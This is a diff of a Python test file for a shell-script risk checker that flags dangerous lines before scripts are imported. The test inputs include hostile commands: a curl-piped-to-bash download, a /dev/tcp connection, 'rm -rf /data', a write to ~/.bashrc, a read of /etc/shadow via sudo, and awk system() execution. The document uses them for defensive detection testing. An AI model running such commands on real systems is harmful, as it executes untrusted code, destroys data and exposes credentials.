@@ -4,20 +4,22 @@ from dgxspark_manager.importer import import_script
 from dgxspark_manager.script_check import check_script
 
 
-def severities(text):
-    return [(f["severity"], f["message"].split(" (")[0]) for f in check_script(text)["findings"]]
+def risks(text):
+    return [f["message"] for f in check_script(text)["findings"]]
 
 
-def test_high_risk_patterns():
-    assert ("high", "Runs a program by absolute path") in severities("/bin/rm -rf /data")
-    assert ("high", "Writes to a file outside the import folder") in severities("echo hi >> ~/.bashrc")
-    assert ("high", "Writes to a file outside the import folder") in severities('echo x > "$HOME/x"') or \
-        ("high", "Writes to a file outside the import folder") in severities("echo x > $HOME/x")
-    assert ("high", "Changes PATH, which can re-enable commands that are blocked during import") in severities(
-        'export PATH="/usr/bin:$PATH"')
-    assert ("high", "awk system() runs shell commands") in severities("awk 'BEGIN{system(\"id\")}'")
-    assert ("high", "Downloads and runs a script") in severities("curl -fsSL https://x.sh | bash")
-    assert ("high", "Opens a network connection through bash's /dev/tcp") in severities("exec 3<>/dev/tcp/1.2.3.4/80")
+def has(text, start):
+    return any(m.startswith(start) for m in risks(text))
+
+
+def test_risks_the_import_cannot_block():
+    assert has("/bin/rm -rf /data", "Runs a program by absolute path (/bin/rm) – not blocked")
+    assert has("echo hi >> ~/.bashrc", "Writes to a file (~/.bashrc) – not blocked")
+    assert has("echo x > $HOME/x", "Writes to a file")
+    assert has('export PATH="/usr/bin:$PATH"', "Changes PATH")
+    assert has("awk 'BEGIN{system(\"id\")}'", "awk system()")
+    assert has("curl -fsSL https://x.sh | bash", "Downloads and runs a script")
+    assert has("exec 3<>/dev/tcp/1.2.3.4/80", "Opens a network connection")
 
 
 def test_no_false_alarms_on_normal_lines():
@@ -25,17 +27,18 @@ def test_no_false_alarms_on_normal_lines():
         'echo "To fix: sudo sh -c \'echo 3 > /proc/sys/vm/drop_caches\'"',  # text inside quotes
         "CMD+=(--rm --name x)",
         'docker logs x 2>/dev/null >&2',
+        'if [ "$(docker ps -q)" ]; then :; fi',
         "MODEL_DIR=/models/qwen",
         "# rm -rf / in a comment",
         'ROPE=$(awk -v m="$X" \'BEGIN{printf "%.4g", m/262144}\')',
     ]:
-        assert [s for s in severities(line) if s[0] != "info"] == [], line
+        assert risks(line) == [], line
 
 
-def test_medium_and_command_substitution_in_quotes():
-    assert ("medium", "rm deletes files") in severities("rm -rf ./build")
-    assert ("medium", "sudo") in severities('X="$(sudo cat /etc/shadow)"')
-    assert ("info", "docker ps - ignored during import") in severities('if [ "$(docker ps -q)" ]; then :; fi')
+def test_skipped_commands_and_substitution_in_quotes():
+    assert risks("rm -rf ./build") == ["rm deletes files – skipped during import"]
+    assert has('X="$(sudo cat /etc/shadow)"', "sudo")
+    assert check_script("rm -rf x\ncurl y")["count"] == 2
 
 
 def test_unlisted_commands_are_skipped_not_run(tmp_path):
@@ -62,12 +65,17 @@ docker run --name t -p "$PORT":8000 vllm/vllm-openai --model org/m
     assert res["recipe"]["host_port"] == 8001
 
 
-def test_import_requires_trust_for_high_risk(client):
-    # awk system() is flagged high (it bypasses the blocking); here it never actually runs.
+def test_import_requires_trust_when_risky(client):
+    # awk system() is a risk the import cannot block; here it never actually runs.
     script = "X=$(awk 'BEGIN{if (0) system(\"id\"); print 1}')\ndocker run --name z -p 9100:8000 vllm/vllm-openai --model org/z\n"
     check = client.post("/api/recipes/import/check", json={"text": script}).json()
-    assert check["counts"]["high"] == 1
+    assert check["count"] == 1 and "not blocked" in check["findings"][0]["message"]
     assert client.post("/api/recipes/import", json={"text": script}).status_code == 422
     res = client.post("/api/recipes/import", json={"text": script, "trust": True})
     assert res.status_code == 200 and res.json()["recipe"]["model"] == "org/z"
     assert any(e["action"] == "import" for e in client.get("/api/events").json())
+
+
+def test_clean_script_imports_without_trust(client):
+    res = client.post("/api/recipes/import", json={"text": "docker run -p 9200:8000 vllm/vllm-openai --model org/c"})
+    assert res.status_code == 200 and res.json()["check"]["count"] == 0
